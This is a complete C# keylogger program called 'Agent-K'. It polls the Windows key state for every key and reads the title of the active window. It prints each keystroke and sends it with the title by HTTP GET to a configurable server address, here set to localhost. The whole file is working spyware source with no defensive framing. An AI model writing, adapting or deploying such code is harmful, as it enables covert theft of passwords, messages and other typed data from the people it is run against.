﻿using System;
using System.Text;
using System.Runtime.InteropServices;
using System.Threading;
using System.Windows;
using System.Web;

namespace Agent_K
{
    class Program
    {
        [DllImport("user32.dll")]
        public static extern int GetAsyncKeyState(Int32 i);

        [DllImport("user32.dll")]
        private static extern IntPtr GetForegroundWindow();

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]


        static extern int GetWindowText(IntPtr hWnd, StringBuilder lpString, int nMaxCount);
        public static List<int> KEY_STATE_LIST = new List<int>(){ 1, -32767, 32769 };
        public static readonly Dictionary<int, string> SpecialKeys = new Dictionary<int, string>
        {
            { 1, "[LEFT_CLICK]" },
            { 2, "[RIGHT_CLICK]" },
            { 8, "[BACKSPACE]" },
            { 9, "[TAB]" },
            { 13, "[ENTER]" },
            { 20, "[CAPS_LOCK]" },
            { 27, "[ESC]" },
            { 32, "[SPACE]" },
            { 37, "[LEFT]" },
            { 38, "[UP]" },
            { 39, "[RIGHT]" },
            { 40, "[DOWN]" },
            { 46, "[DELETE]" },
            { 186, "[;]" },
            { 192, "[`]" },
            { 222, "[']" }
        };

        public static string SERVER = "http://localhost";

        private static void Main(string[] args)
        {
            Console.WriteLine("[*] Agent-K has been initialized.");
            hanlder();
        }

        private static void hanlder() 
        {
            while (true)
            {
                for (int i = 0; i < 255; i++)
                {
                    int keyState = GetAsyncKeyState(i);
                    if (KEY_STATE_LIST.Contains(keyState))
                    {
                        string key = GetKeyString(i);
                        string title = GetWinText();
                        Console.WriteLine($"[*] Agent-K: [TITLE: {title}] [CHAR: {key}] [INDEX: {i}]");
                        send(title, key, i);
                    }
                }
            }
        }

        private static async void send(string title, string key, int i) 
        {
            HttpClient client = new HttpClient();
            string encodedTitle = HttpUtility.UrlEncode(title);
            string encodedKey = HttpUtility.UrlEncode(key);
            string encodedIndex = HttpUtility.UrlEncode(i.ToString());
            string url = $"{SERVER}?title={title}&char={encodedKey}&index={encodedIndex}";
            HttpResponseMessage response = await client.GetAsync(url);
        }

        private static string GetWinText()
        {
            StringBuilder title = new StringBuilder(256);
            IntPtr hWindow = GetForegroundWindow();
            GetWindowText(hWindow, title, title.Capacity);
            return title.ToString();
        }

        private static string GetKeyString(int index)
        {
            string result = "";
            result = Char.ToString(Convert.ToChar(index));
            if (SpecialKeys.ContainsKey(index)) {
                result = SpecialKeys[index];
            }
            return result;
        }
    }
}